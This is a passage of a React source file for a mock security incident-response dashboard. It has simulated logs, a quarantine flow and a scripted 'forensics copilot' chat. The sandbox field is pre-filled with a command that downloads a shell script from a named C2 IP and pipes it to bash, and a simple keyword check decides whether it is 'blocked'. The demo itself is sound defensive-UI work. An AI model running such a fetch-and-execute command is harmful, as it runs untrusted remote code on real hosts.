import { useState, useEffect, useRef } from "react";
import { motion, AnimatePresence } from "motion/react";
import { MOCK_ALERTS, MOCK_USER_RISKS } from "../mockData";
import { Alert, Severity } from "../types";
import {
  Terminal as TerminalIcon,
  Cpu,
  ShieldAlert,
  Network,
  Lock,
  Workflow,
  Sparkles,
  ChevronRight,
  ChevronDown,
  User,
  Layers,
  Send,
  Activity,
  Play,
  CheckCircle2,
  AlertTriangle,
  X,
  FileCode,
  SlidersHorizontal,
  Folder,
  FolderOpen,
  Search,
  CornerDownRight,
  RefreshCw,
  Eye,
  Settings,
  Flame,
  Binary,
  Database,
  Unplug,
  Code,
  Shield,
  Clock,
  ExternalLink,
  Info,
} from "lucide-react";
import ReactMarkdown from "react-markdown";

interface DashboardProps {
  onSelectAlert: (alert: Alert) => void;
  onOpenAiPanel: () => void;
  isRefreshing: boolean;
}

// Custom mock folder structures representing cluster namespaces and active investigations
interface FileTreeNode {
  name: string;
  type: "folder" | "alert" | "log";
  alertId?: string;
  children?: FileTreeNode[];
  status?: string;
}

export default function Dashboard({ onSelectAlert, onOpenAiPanel, isRefreshing }: DashboardProps) {
  // Current active forensic alert focused
  const [selectedAlert, setSelectedAlert] = useState<Alert>(MOCK_ALERTS[0]);
  const [activeProcessNode, setActiveProcessNode] = useState<string>("spawn"); // 'parent' | 'spawn' | 'socket'
  const [activeCopilotTab, setActiveCopilotTab] = useState<"chat" | "sandbox" | "weights">("chat");

  // File tree nodes expanded states
  const [expandedFolders, setExpandedFolders] = useState<Record<string, boolean>>({
    "kube-system": true,
    "prod-cluster-east": true,
    "threat-vectors": true,
    forensics: true,
  });

  // Search filter and log highlights
  const [filterQuery, setFilterQuery] = useState("");
  const [terminalSearch, setTerminalSearch] = useState("");

  // Live scrolling logs console
  const [logMessages, setLogMessages] = useState<
    Array<{
      id: number;
      timestamp: string;
      level: string;
      source: string;
      msg: string;
      highlighted?: boolean;
    }>
  >([]);
  const [isPlayingTerminal, setIsPlayingTerminal] = useState(true);

  // Interactive sandbox variables
  const [sandboxCommand, setSandboxCommand] = useState(
    "curl http://194.26.135.84/malware-payload.sh | bash"
  );
  const [sandboxLogs, setSandboxLogs] = useState<string[]>([]);
  const [isSandboxRunning, setIsSandboxRunning] = useState(false);

  // Quarantine nodes state
  const [quarantinedNodes, setQuarantinedNodes] = useState<string[]>([]);
  const [activeContainmentProgress, setActiveContainmentProgress] = useState(0);
  const [isQuarantining, setIsQuarantining] = useState(false);

  // Chat parameters
  const [chatInputValue, setChatInputValue] = useState("");
  const [chatMessages, setChatMessages] = useState<
    Array<{ sender: "ai" | "user"; text: string; time: string }>
  >([]);
  const [isAiTyping, setIsAiTyping] = useState(false);
  const chatEndRef = useRef<HTMLDivElement>(null);

  // Dynamic weights representing live model contribution factors
  const [shapWeights, setShapWeights] = useState<Record<string, number>>({});

  // Initialize SHAP weights
  useEffect(() => {
    if (selectedAlert?.details?.shapFactors) {
      const weights: Record<string, number> = {};
      selectedAlert.details.shapFactors.forEach((factor) => {
        weights[factor.factor] = factor.impact;
      });
      setShapWeights(weights);
    }

    // Auto-stream evaluation diagnostics to chat
    setIsAiTyping(true);
    const textIntro = `### 🧠 Gemini Security Forensic Evaluator
  
Target container environment **\`${selectedAlert.source}\`** exhibits severe process contamination under rule **\`SEC-MODEL-FOREST-v2\`**.

#### 🎯 Forensic Fingerprint Analysis:
${selectedAlert.details.shapFactors?.map((f) => `- **${f.factor}**: Anomaly weight **${(f.impact * 100).toFixed(0)}%**`).join("\n")}

#### 📜 Execution Traceback Chain:
1. **Parent Service**: \`${selectedAlert.details.parentProcess || "systemd-containerd"}\` spawned nested workspace container.
2. **Injected Payload**: \`${selectedAlert.details.processPath || "/usr/local/bin/k8s-api-agent"}\` initiated raw shell namespace redirection.
3. **Egress Vector**: Direct socket connection to **\`${selectedAlert.details.ipAddress || "194.26.135.84"}\`** on remote port **\`${selectedAlert.details.port || 443}\`**.

*Remediation directive generated. Click **APPLY CONTAINER QUARANTINE** inside the Sandbox pane or enter custom instructions.*`;

    const t = setTimeout(() => {
      setChatMessages([
        {
          sender: "ai",
          text: textIntro,
          time: new Date().toLocaleTimeString([], {
            hour: "2-digit",
            minute: "2-digit",
            second: "2-digit",
          }),
        },
      ]);
      setIsAiTyping(false);
    }, 400);

    return () => clearTimeout(t);
  }, [selectedAlert]);

  // Seed live stream logs simulation
  useEffect(() => {
    const rawLogs = [
      {
        level: "INFO",
        source: "containerd",
        msg: "Namespace initialization completed for sandbox workstation-91",
      },
      {
        level: "WARN",
        source: "k8s-agent",
        msg: "System call deviation detected: sys_clone initiated with custom namespaces",
      },
      {
        level: "ALERT",
        source: "sys_filter",
        msg: "Raw tcp redirection spawned by unauthorized terminal payload",
      },
      {
        level: "INFO",
        source: "containerd",
        msg: "kube-system pod replica set synced with master scheduler",
      },
      {
        level: "CRIT",
        source: "gRPC-sec",
        msg: "Outbound trace matched dark IP reputation threat database [194.26.135.84]",
      },
      { level: "INFO", source: "syslog", msg: "auditd connection pool limits reset successfully" },
      {
        level: "WARN",
        source: "iam-auth",
        msg: "MFA validation bypassed: Token exchange occurred from impossible geographic coordinates",
      },
      {
        level: "ALERT",
        source: "sys_filter",
        msg: "Massive database dump initiated through standard egress socket port",
      },
      {
        level: "INFO",
        source: "containerd",
        msg: "Egress filter rules refreshed. Active policies: 14",
      },
    ];

    let counter = 1;
    // Set initial block
    const initialLogs = Array.from({ length: 15 }).map((_, i) => {
      const template = rawLogs[i % rawLogs.length];
      return {
        id: counter++,
        timestamp: new Date(Date.now() - (15 - i) * 2000).toLocaleTimeString([], { hour12: false }),
        level: template.level,
        source: template.source,
        msg: template.msg,
        highlighted: template.level === "CRIT" || template.level === "ALERT",
      };
    });
    setLogMessages(initialLogs);

    // Active log updates
    const interval = setInterval(() => {
      if (!isPlayingTerminal) return;

      const template = rawLogs[Math.floor(Math.random() * rawLogs.length)];
      setLogMessages((prev) => {
        const next = [
          ...prev,
          {
            id: counter++,
            timestamp: new Date().toLocaleTimeString([], { hour12: false }),
            level: template.level,
            source: template.source,
            msg: template.msg,
            highlighted: template.level === "CRIT" || template.level === "ALERT",
          },
        ];
        return next.slice(-40); // Keep last 40 entries
      });
    }, 3000);

    return () => clearInterval(interval);
  }, [isPlayingTerminal]);

  // Execute terminal sandbox test commands
  const runSandboxCommand = () => {
    if (!sandboxCommand.trim()) return;
    setIsSandboxRunning(true);
    setSandboxLogs([]);

    const logLine = (text: string, delay: number) => {
      setTimeout(() => {
        setSandboxLogs((prev) => [...prev, text]);
      }, delay);
    };

    logLine(`$ darkvector-sandbox-cli --exec "${sandboxCommand}"`, 100);
    logLine(`[info] Initializing sandboxed emulation environment (ChromaDB Vector v1.8)...`, 400);
    logLine(`[info] Mirroring active container state for host [${selectedAlert.source}]`, 700);

    if (
      sandboxCommand.toLowerCase().includes("malware") ||
      sandboxCommand.toLowerCase().includes("194.26") ||
      sandboxCommand.toLowerCase().includes("escape")
    ) {
      logLine(`[warn] WARNING: Network trace matches known malware payload footprint!`, 1000);
      logLine(`[crit] ANOMALY INTERCEPTED: Process attempted unauthorized memory remap!`, 1300);
      logLine(`[ai-action] Gemini model generated mitigation proposal automatically.`, 1600);
      logLine(`[info] Execution blocked. Sandbox isolated. Sandbox status: SECURE`, 1900);
    } else {
      logLine(`[info] Process executed successfully with normal exit status (0).`, 1200);
      logLine(`[info] Anomaly confidence index: 0.012 (Safe)`, 1500);
    }

    setTimeout(() => {
      setIsSandboxRunning(false);
    }, 2000);
  };

  // Run dynamic quarantine
  const handleQuarantineNode = () => {
    if (quarantinedNodes.includes(selectedAlert.source)) {
      alert(`Node ${selectedAlert.source} is already quarantined.`);
      return;
    }

    setIsQuarantining(true);
    setActiveContainmentProgress(5);

    const interval = setInterval(() => {
      setActiveContainmentProgress((p) => {
        if (p >= 100) {
          clearInterval(interval);
          setQuarantinedNodes((prev) => [...prev, selectedAlert.source]);
          setIsQuarantining(false);

          setChatMessages((prev) => [
            ...prev,
            {
              sender: "ai",
              text: `### 🔴 CONTAINMENT SUCCESSFUL\n\n**${selectedAlert.source}** has been fully isolated from the Kubernetes virtual network cluster.\n\n- Egress Policy applied: \`block-all-routes\`\n- Active gRPC daemon reports namespace containment status: **CLOSED**`,
              time: new Date().toLocaleTimeString([], {
                hour: "2-digit",
                minute: "2-digit",
                second: "2-digit",
              }),
            },
          ]);
          return 100;
        }
        return p + 25;
      });
    }, 400);
  };

  // Conversational AI messaging input
  const handleSendChat = (e: React.FormEvent) => {
    e.preventDefault();
    if (!chatInputValue.trim()) return;

    const queryText = chatInputValue;
    setChatInputValue("");
    const time = new Date().toLocaleTimeString([], {
      hour: "2-digit",
      minute: "2-digit",
      second: "2-digit",
    });

    setChatMessages((prev) => [...prev, { sender: "user", text: queryText, time }]);
    setIsAiTyping(true);

    setTimeout(() => {
      let response = "";
      const query = queryText.toLowerCase();

      if (query.includes("isolate") || query.includes("quarantine") || query.includes("/isolate")) {
        response = `### 🚨 Isolation Directive Armed
      
I have initialized a quarantine manifest for **\`${selectedAlert.source}\`**.

\`\`\`yaml
# Kubernetes Remediation Patch
apiVersion: apps/v1
kind: Deployment
metadata:
  name: ${selectedAlert.source.split("-")[0] || "app-pod"}
  namespace: production
  labels:
    darkvector.security/containment: "true"
    darkvector.security/quarantined: "true"
\`\`\`

Would you like me to dispatch the network lockdown script right now via the **Sandbox** interface?`;
      } else if (query.includes("network") || query.includes("port") || query.includes("block")) {
        response = `### 🛡️ Core Egress Control Policy

To completely seal off outbound TCP traffic directed to destination C2 IP **\`${selectedAlert.details.ipAddress || "194.26.135.84"}\`**, we apply the following rule:

\`\`\`yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: block-malicious-egress
  namespace: production
spec:
  podSelector:
    matchLabels:
      app: ${selectedAlert.source.split("-")[0] || "app"}
  policyTypes:
  - Egress
  egress:
  - to:
    - ipBlock:
        cidr: 0.0.0.0/0
        except:
        - ${selectedAlert.details.ipAddress || "194.26.135.84"}/32
\`\`\`

*This rule terminates target connection pipelines immediately without interrupting internal DNS queries.*`;
      } else if (query.includes("explain") || query.includes("shap") || query.includes("why")) {
        response = `### 📊 Explaining Anomaly Weightings
      
The model triggered on **\`${selectedAlert.id}\`** due to three key features:

1. **\`network_egress_anomaly\`** (Influence: **${(shapWeights["network_egress_anomaly"] * 100 || 84).toFixed(0)}%**): The socket destination has no baseline records within our ChromaDB vector database.
2. **\`syscall_deviation_index\`** (Influence: **${(shapWeights["syscall_deviation_index"] * 100 || 62).toFixed(0)}%**): The spawning process used system namespace clone masks abnormal to typical node baselines.
3. **\`reputation_threat_match\`** (Influence: **${(shapWeights["reputation_threat_match"] * 100 || 90).toFixed(0)}%**): Destination IP **\`${selectedAlert.details.ipAddress}\`** matches active malware telemetry indicators.`;
      } else {
        response = `### 📡 Sandbox Inspection Log
      
I have evaluated your request against host **\`${selectedAlert.source}\`**.

- **Host Status**: ${quarantinedNodes.includes(selectedAlert.source) ? "🔴 QUARANTINED (Network Cut)" : "🟢 RUNNING (Monitored)"}
- **Baseline Match Rate**: **${(100 - selectedAlert.score).toFixed(1)}%** standard behavior
- **Containment Recommendation**: Highly recommended to deploy isolated label blocks.

Ask me to draft specialized mitigation parameters or explain system call traces.`;
      }

      setChatMessages((prev) => [
        ...prev,
        {
          sender: "ai",
          text: response,
          time: new Date().toLocaleTimeString([], {
            hour: "2-digit",
            minute: "2-digit",
            second: "2-digit",
          }),
        },
      ]);
      setIsAiTyping(false);
    }, 1000);
  };

  // Toggle folder tree structures
  const toggleFolder = (name: string) => {
    setExpandedFolders((prev) => ({ ...prev, [name]: !prev[name] }));
  };

  // Scroll chat
  useEffect(() => {
    chatEndRef.current?.scrollIntoView({ behavior: "smooth" });
  }, [chatMessages, isAiTyping]);

  // Adjust SHAP weight on sliders
  const handleWeightTweak = (factor: string, val: number) => {
    setShapWeights((prev) => ({ ...prev, [factor]: val }));
  };

  // File tree mock node structure mapping
  const clusterTree: FileTreeNode[] = [
    {
      name: "us-east-1-cluster",
      type: "folder",
      children: [
        {
          name: "kube-system",
          type: "folder",
          children: [
            { name: "srv-k8s-api-01", type: "alert", alertId: "AL-8491" },
            { name: "coredns-pod-02", type: "log" },
          ],
        },
        {
          name: "prod-cluster-east",
          type: "folder",
          children: [
            { name: "db-replica-srv-10", type: "alert", alertId: "AL-8310" },
            { name: "ingress-gateway-v4", type: "log" },
          ],
        },
      ],
    },
    {
      name: "security-forensics",
      type: "folder",
      children: [
        { name: "AL-7982: Impossible travel auth", type: "alert", alertId: "AL-7982" },
        { name: "AL-5120: TLS handshake failure", type: "alert", alertId: "AL-5120" },
      ],
    },
  ];

  // Helper renderer for File Tree Nodes (Cursor IDE Style)
  const renderFileTree = (nodes: FileTreeNode[], depth = 0) => {
    return nodes.map((node, idx) => {
      const isFolder = node.type === "folder";
      const isOpen = expandedFolders[node.name];
      const isAlert = node.type === "alert";

      const isSelected = isAlert && selectedAlert.id === node.alertId;

      return (
        <div key={idx} style={{ paddingLeft: `${depth * 10}px` }} className="space-y-0.5">
          {isFolder ? (
            <button
              onClick={() => toggleFolder(node.name)}
              className="w-full flex items-center gap-1.5 py-1 px-1.5 hover:bg-[#161A22]/60 rounded text-[11px] font-mono text-gray-400 hover:text-gray-200 transition-colors text-left"
            >
              {isOpen ? (
                <ChevronDown className="w-3 h-3 text-gray-500 shrink-0" />
              ) : (
                <ChevronRight className="w-3 h-3 text-gray-500 shrink-0" />
              )}
              {isOpen ? (
                <FolderOpen className="w-3.5 h-3.5 text-blue-400/80 shrink-0" />
              ) : (
                <Folder className="w-3.5 h-3.5 text-blue-500/70 shrink-0" />
              )}
              <span className="truncate">{node.name}</span>
            </button>
          ) : (
            <button
              onClick={() => {
                if (node.alertId) {
                  const found = MOCK_ALERTS.find((a) => a.id === node.alertId);
                  if (found) {
                    setSelectedAlert(found);
                    onSelectAlert(found);
                  }
                }
              }}
              className={`w-full flex items-center justify-between py-1 px-2 rounded text-[11px] font-mono transition-colors text-left ${
                isSelected
                  ? "bg-blue-500/10 text-blue-400 border-l-2 border-blue-500 font-semibold"
                  : "text-gray-400 hover:bg-[#161A22]/40 hover:text-gray-300"
              }`}
            >
              <div className="flex items-center gap-1.5 min-w-0">
                {isAlert ? (
                  <ShieldAlert className="w-3.5 h-3.5 text-red-400/80 shrink-0" />
                ) : (
                  <Binary className="w-3.5 h-3.5 text-gray-500 shrink-0" />
                )}
                <span className="truncate">{node.name}</span>
              </div>

              {isAlert && (
                <span
                  className={`text-[8px] px-1 rounded scale-90 ${
                    node.alertId === "AL-8491" || node.alertId === "AL-8310"
                      ? "bg-red-500/10 text-red-400"
                      : "bg-orange-500/10 text-orange-400"
                  }`}
                >
                  TR
                </span>
              )}
            </button>
          )}

          {isFolder && isOpen && node.children && (
            <div className="space-y-0.5 border-l border-[#23262F]/40 ml-2 mt-0.5">
              {renderFileTree(node.children, depth + 1)}
            </div>
          )}
        </div>
      );
    });
  };

  return (
    <div className="flex flex-col gap-4 h-full min-h-[calc(100vh-140px)] select-none">
      {/* Operating System Breadcrumb Hub */}
      <div className="bg-[#111317] border border-[#23262F] rounded-lg px-4 py-2 flex items-center justify-between text-xs font-mono shrink-0">
        <div className="flex items-center gap-1.5 text-[11px]">
          <span className="text-gray-500">DarkVector OS</span>
          <ChevronRight className="w-3 h-3 text-gray-600" />
          <span className="text-gray-400">Cluster nodes</span>
          <ChevronRight className="w-3 h-3 text-gray-600" />
          <span className="text-blue-400 font-bold">{selectedAlert.source}</span>
          <ChevronRight className="w-3 h-3 text-gray-600" />
          <span className="text-purple-400">{selectedAlert.id}</span>
        </div>

        <div className="flex items-center gap-3 text-[10px]">
          <div className="flex items-center gap-1 text-gray-400">
            <span className="w-1.5 h-1.5 rounded-full bg-red-500 animate-pulse" />
            <span>Critical incident response board</span>
          </div>
        </div>
      </div>

      {/* Main OS Asymmetric Space Layout (Split into 3 distinct sections) */}
      <div className="flex-1 grid grid-cols-1 xl:grid-cols-12 gap-3 min-h-0 items-stretch">
        {/* Left Column (xl:col-span-2) - High-Density Cursor-Style Explorer Tree */}
        <div className="xl:col-span-2 bg-[#111317] border border-[#23262F] rounded-xl flex flex-col justify-between overflow-hidden">
          <div className="flex flex-col h-full min-h-0">
            {/* Explorer Title */}
            <div className="p-4 border-b border-[#23262F]/60 flex items-center justify-between">
              <span className="text-[10px] font-mono font-bold text-gray-400 flex items-center gap-2">
                <Layers className="w-3.5 h-3.5 text-blue-400" />
                Workspace explorer
              </span>
              <span className="text-[9px] font-mono text-gray-500 bg-black px-2 py-0.5 rounded border border-[#23262F]">
                K8s
              </span>
            </div>

            {/* Quick Filter Search inside tree */}
            <div className="p-2 border-b border-[#23262F]/30 bg-black/10">
              <div className="relative">
                <Search className="absolute left-2 top-1.5 w-3 h-3 text-gray-600" />
                <input
                  type="text"
                  value={filterQuery}
                  onChange={(e) => setFilterQuery(e.target.value)}
                  placeholder="Filter targets..."
                  className="w-full bg-[#09090B] border border-[#23262F] rounded px-2 py-1 pl-6 text-[10px] font-mono text-gray-300 focus:outline-none focus:border-blue-500 placeholder-gray-600"
                />
              </div>
            </div>

            {/* File Tree Area */}
            <div className="flex-1 overflow-y-auto p-2 space-y-0.5 scrollbar-thin">
              {renderFileTree(clusterTree)}

              <div className="pt-4 mt-4 border-t border-[#23262F]/30">
                <div className="px-2 pb-2 text-[9px] font-mono text-gray-500 font-bold">
                  Active detectors
                </div>
                {MOCK_ALERTS.map((item) => {
                  const isSelected = selectedAlert.id === item.id;
                  return (
                    <motion.button
                      key={item.id}
                      onClick={() => {
                        setSelectedAlert(item);
                        onSelectAlert(item);
                      }}
                      whileTap={{ scale: 0.985 }}
                      className={`w-full flex flex-col p-2 rounded text-left relative transition-colors duration-200 text-xs font-mono ${
                        isSelected
                          ? "text-purple-400 font-semibold"
                          : "text-gray-500 hover:text-gray-300"
                      }`}
                    >
                      {/* Premium gliding background pill */}
                      {isSelected && (
                        <motion.div
                          layoutId="activeDetectorBackground"
                          className="absolute inset-0 bg-purple-500/10 border-l-2 border-purple-500 rounded z-0"
                          transition={{ type: "spring", damping: 28, stiffness: 350 }}
                        />
                      )}

                      <div className="w-full relative z-10">
                        <div className="flex justify-between items-center text-[10px]">
                          <span className="font-bold">{item.id}</span>
                          <span
                            className={`text-[8px] font-bold px-1 rounded ${
                              item.severity === "critical"
                                ? "text-red-400 bg-red-500/10 border border-red-500/20"
                                : "text-orange-400 bg-orange-500/10 border border-orange-500/20"
                            }`}
                          >
                            {item.severity}
                          </span>
                        </div>
                        <span className="text-[10px] truncate max-w-[150px] text-gray-300 font-sans font-medium mt-0.5 block">
                          {item.type}
                        </span>
                      </div>
                    </motion.button>
                  );
                })}
              </div>
            </div>
          </div>

          <div className="p-2 border-t border-[#23262F]/40 bg-black/20 flex items-center justify-between text-[9px] font-mono text-gray-500">
            <span>Daemon context:</span>
            <span className="text-green-500 animate-pulse font-bold">● Exporting</span>
          </div>
        </div>

        {/* Center Column (xl:col-span-6) - Investigative Analysis Workbench (Visual lineage + Console) */}
        <div className="xl:col-span-6 flex flex-col gap-3 overflow-hidden min-h-0">
          {/* Top Panel: Interactive Ancestry Process Graph */}
          <div className="bg-[#111317] border border-[#23262F] rounded-xl p-4 flex flex-col justify-between overflow-hidden relative">
            {/* Header info bar */}
            <div className="flex items-start justify-between border-b border-[#23262F]/60 pb-3">
              <div>
                <div className="flex items-center gap-2">
                  <span className="text-[10px] font-mono bg-blue-500/10 text-blue-400 border border-blue-500/20 px-2 py-0.5 rounded font-extrabold tracking-wider">
                    Investigation graph
                  </span>
                  <span className="text-[10px] font-mono text-gray-500">Target host:</span>
                  <span className="text-gray-200 font-mono text-xs font-semibold">
                    {selectedAlert.source}
                  </span>
                </div>
                <h1 className="text-sm font-semibold text-gray-100 mt-1 flex items-center gap-1.5">
                  <Flame className="w-4 h-4 text-red-400" />
                  {selectedAlert.type}
                </h1>
              </div>

              <div className="text-right">
                <span className="text-[10px] font-mono text-gray-500 block">
                  Outlier confidence
                </span>
                <span className="text-base font-mono font-bold text-orange-400">
                  {(selectedAlert.score / 100).toFixed(4)}
                </span>
              </div>
            </div>

            {/* Simulated Live Visual Lineage Graph with customized nodes */}
            <div className="bg-[#09090B] border border-[#23262F] rounded-xl p-4 my-4 relative overflow-hidden flex flex-col items-stretch justify-center h-64">
              <div className="absolute top-2 left-2 flex items-center gap-2 text-[9px] font-mono text-gray-500">
                <Workflow className="w-3.5 h-3.5 text-blue-500" />
                <span>Interactive process ancestry clustermap</span>
              </div>

              {/* Simulated Nodes Map */}
              <div className="flex items-center justify-around relative">
                {/* Node 1: Pod Environment Context */}
                <div
                  onClick={() => setActiveProcessNode("parent")}
                  className={`w-40 p-2 rounded-lg border text-left cursor-pointer transition-all duration-150 relative ${
                    activeProcessNode === "parent"
                      ? "bg-blue-500/5 border-blue-500/50 text-blue-400 shadow shadow-blue-500/10"
                      : "bg-[#111317] border-[#23262F] text-gray-400 hover:border-gray-500/30"
                  }`}
                >
                  <div className="flex items-center justify-between text-[8px] font-mono text-gray-500">
                    <span>K8s pod environment</span>
                    <span className="text-blue-500 font-bold">1/1</span>
                  </div>
                  <div className="text-[11px] font-bold mt-1 truncate">
                    {selectedAlert.source.split("-")[0] || "app-service"}
                  </div>
                  <div className="text-[9px] font-mono text-gray-500 truncate mt-1">
                    IP: {selectedAlert.details.ipAddress || "10.244.12.80"}
                  </div>
                </div>

                {/* Connecting Vector Line */}
                <div className="flex-1 h-0.5 bg-gradient-to-r from-blue-500/30 to-purple-500/30 relative mx-2">
                  <div className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-2 h-2 rounded-full bg-purple-400 animate-ping" />
                </div>

                {/* Node 2: Spawned Binary Execution Payload */}
                <div
                  onClick={() => setActiveProcessNode("spawn")}
                  className={`w-44 p-2 rounded-lg border text-left cursor-pointer transition-all duration-150 relative ${
                    activeProcessNode === "spawn"
                      ? "bg-purple-500/5 border-purple-500/50 text-purple-400 shadow shadow-purple-500/10"
                      : "bg-[#111317] border-[#23262F] text-gray-400 hover:border-gray-500/30"
                  }`}
                >
                  <div className="absolute -top-1.5 -right-1.5 bg-red-500 text-[8px] font-mono font-extrabold px-1 rounded text-white animate-pulse">
                    DEV {selectedAlert.score}%
                  </div>
                  <div className="flex items-center justify-between text-[8px] font-mono text-gray-500">
                    <span>Process injector</span>
                    <span className="text-purple-400 font-bold">PID 28410</span>
                  </div>
                  <div className="text-[11px] font-bold mt-1 truncate font-mono">
                    {selectedAlert.details.processPath || "bin/exec-payload"}
                  </div>
                  <div className="text-[9px] font-mono text-gray-500 truncate mt-1">
                    Parent: {selectedAlert.details.parentProcess || "containerd-shim"}
                  </div>
                </div>

                {/* Connecting Vector Line */}
                <div className="flex-1 h-0.5 bg-gradient-to-r from-purple-500/30 to-red-500/30 relative mx-2">
                  <div className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-2 h-2 rounded-full bg-red-400" />
                </div>

                {/* Node 3: Outbound Sockets Target Destination */}
                <div
                  onClick={() => setActiveProcessNode("socket")}
                  className={`w-40 p-2 rounded-lg border text-left cursor-pointer transition-all duration-150 relative ${
                    activeProcessNode === "socket"
                      ? "bg-red-500/5 border-red-500/50 text-red-400 shadow shadow-red-500/10"
                      : "bg-[#111317] border-[#23262F] text-gray-400 hover:border-gray-500/30"
                  }`}
                >
                  <div className="flex items-center justify-between text-[8px] font-mono text-gray-500">
                    <span>Egress reputation match</span>
                    <span className="text-red-400 font-bold">
                      PORT {selectedAlert.details.port || 443}
                    </span>
                  </div>
                  <div className="text-[11px] font-bold mt-1 truncate font-mono">
                    {selectedAlert.details.ipAddress || "194.26.135.84"}
                  </div>
                  <div className="text-[9px] font-mono text-red-400/80 truncate mt-1">
                    Type: External C2 Host
                  </div>
                </div>
              </div>

              {/* Node Explainer Text box inside panel */}
              <div className="mt-4 p-2 bg-[#111317]/80 border border-[#23262F]/60 rounded-lg text-[10px] text-gray-400 font-sans leading-relaxed">
                {activeProcessNode === "parent" && (
                  <div>
                    <span className="font-mono text-blue-400 font-bold">Info:</span> Pod context
                    environment holds standard namespace limits. No local volume modifications
                    detected. Sandbox isolation maintains minimal baseline deviations.
                  </div>
                )}
                {activeProcessNode === "spawn" && (
                  <div>
                    <span className="font-mono text-purple-400 font-bold">Warn:</span> Deep vector
                    deviation detected. Binary file execution located in non-standard namespace.
                    Container security policies matched signature of raw shell redirects.
                  </div>
                )}
                {activeProcessNode === "socket" && (
                  <div>
                    <span className="font-mono text-red-400 font-bold">Critical threat:</span>{" "}
                    Target destination matches active Command & Control IP addresses listed in the
                    threat registry collections database. Direct isolation recommended.
                  </div>
                )}
              </div>
            </div>

            {/* Action buttons panel below tree */}
            <div className="flex items-center justify-between pt-1 text-xs">
              <span className="text-[10px] font-mono text-gray-500">
                Cluster environment quarantine state:
              </span>
              <div className="flex gap-2">
                <button
                  onClick={handleQuarantineNode}
                  disabled={isQuarantining || quarantinedNodes.includes(selectedAlert.source)}
                  className={`px-4 py-2 font-mono text-[10px] font-extrabold rounded-md flex items-center gap-2 transition-colors cursor-pointer ${
                    quarantinedNodes.includes(selectedAlert.source)
                      ? "bg-red-500/10 border border-red-500/20 text-red-400"
                      : "bg-red-600 hover:bg-red-500 text-white shadow shadow-red-500/20"
                  }`}
                >
                  <Unplug className="w-3 h-3" />
                  {isQuarantining
                    ? "Containing..."
                    : quarantinedNodes.includes(selectedAlert.source)
                      ? "Node isolated"
                      : "Dispatch container quarantine"}
                </button>
              </div>
            </div>

            {isQuarantining && (
              <div className="absolute inset-x-0 bottom-0 h-1 bg-[#161A22] overflow-hidden">
                <div
                  className="h-full bg-red-500 transition-all duration-300"
                  style={{ width: `${activeContainmentProgress}%` }}
                />
              </div>
            )}
          </div>

          {/* Bottom Panel: Chronological Hex/Telemetry Stream Console */}
          <div className="bg-[#111317] border border-[#23262F] rounded-xl p-4 flex flex-col justify-between overflow-hidden flex-1">
            <div className="flex items-center justify-between border-b border-[#23262F]/40 pb-2 mb-2">
              <div className="flex items-center gap-2">
                <TerminalIcon className="w-4 h-4 text-purple-400" />
                <span className="text-[10px] font-mono font-bold text-gray-200">
                  Real-time host telemetry stream
                </span>
              </div>

              <div className="flex items-center gap-2">
                <input
                  type="text"
                  value={terminalSearch}
                  onChange={(e) => setTerminalSearch(e.target.value)}
                  placeholder="Filter logs (grep)..."
                  className="bg-[#09090B] border border-[#23262F] text-[9px] font-mono rounded px-2 py-0.5 text-gray-300 focus:outline-none focus:border-purple-500 placeholder-gray-600 w-32"
                />
                <button
                  onClick={() => setIsPlayingTerminal(!isPlayingTerminal)}
                  className={`text-[9px] font-mono px-2 py-0.5 rounded cursor-pointer border ${
                    isPlayingTerminal
                      ? "bg-green-500/10 text-green-400 border-green-500/20"
                      : "bg-yellow-500/10 text-yellow-400 border-yellow-500/20"
                  }`}
                >
                  {isPlayingTerminal ? "Live" : "Paused"}
                </button>
              </div>
            </div>

            {/* Monospaced Log Output Console */}
            <div className="bg-[#09090B] border border-[#23262F]/60 rounded-xl p-2 font-mono text-[10px] leading-relaxed overflow-y-auto max-h-56 min-h-[140px] flex-1 space-y-2 scrollbar-thin scroll-smooth text-gray-400">
              {logMessages
                .filter(
                  (log) =>
                    !terminalSearch ||
                    log.msg.toLowerCase().includes(terminalSearch.toLowerCase()) ||
                    log.source.toLowerCase().includes(terminalSearch.toLowerCase())
                )
                .map((log) => (
                  <div
                    key={log.id}
                    onClick={() => {
                      // Click on log to ask Copilot
                      setChatInputValue(`/explain log line ${log.id}: "${log.msg}"`);
                    }}
                    className={`flex items-start gap-2 cursor-pointer hover:bg-[#161A22]/40 p-1 rounded transition-colors group ${
                      log.highlighted ? "bg-red-950/20 text-red-300" : ""
                    }`}
                  >
                    <span className="text-gray-600 select-none shrink-0">{log.timestamp}</span>
                    <span
                      className={`shrink-0 font-bold scale-90 ${
                        log.level === "CRIT"
                          ? "text-red-400"
                          : log.level === "ALERT"
                            ? "text-orange-400"
                            : log.level === "WARN"
                              ? "text-yellow-400"
                              : "text-blue-400"
                      }`}
                    >
                      [{log.level}]
                    </span>
                    <span className="text-gray-500 shrink-0 font-bold">{log.source}:</span>
                    <span className="flex-1 text-gray-300 truncate max-w-full" title={log.msg}>
                      {log.msg}
                    </span>
                    <span className="opacity-0 group-hover:opacity-100 text-[8px] text-purple-400 font-bold ml-1 shrink-0">
                      [Ask Vector]
                    </span>
                  </div>
                ))}
            </div>

            <div className="pt-2 flex items-center justify-between text-[9px] font-mono text-gray-500">
              <span>
                * Double-click any log sequence string to feed raw tracing markers into Vector.
              </span>
              <span>Buffer: {logMessages.length}/40</span>
            </div>
          </div>
        </div>

        {/* Right Column (xl:col-span-4) - Vector AI Security Agent Core Dashboard */}
        <div className="xl:col-span-4 bg-[#111317] border border-[#23262F] rounded-xl flex flex-col justify-between overflow-hidden min-h-0 h-full relative">
          {/* Header containing specialized copilot categories */}
          <div className="p-3 bg-[#161A22]/40 border-b border-[#23262F] shrink-0">
            <div className="flex items-center justify-between pb-2">
              <div className="flex items-center gap-2">
                <Sparkles className="w-4.5 h-4.5 text-purple-400 animate-pulse" />
                <span className="text-xs font-mono font-bold text-gray-200">
                  Vector forensics copilot
                </span>
              </div>

              <div className="bg-[#09090B] border border-[#23262F] rounded-lg px-2 py-0.5 text-[8px] font-mono text-purple-400 font-extrabold flex items-center gap-1">
                <span className="w-1.5 h-1.5 rounded-full bg-purple-400 animate-ping" />
                <span>Vector agent 2.5</span>
              </div>
            </div>

            {/* Workspace tabs (Chat vs Sandbox vs Model parameters) */}
            <div className="flex gap-2 pt-2">
              <button
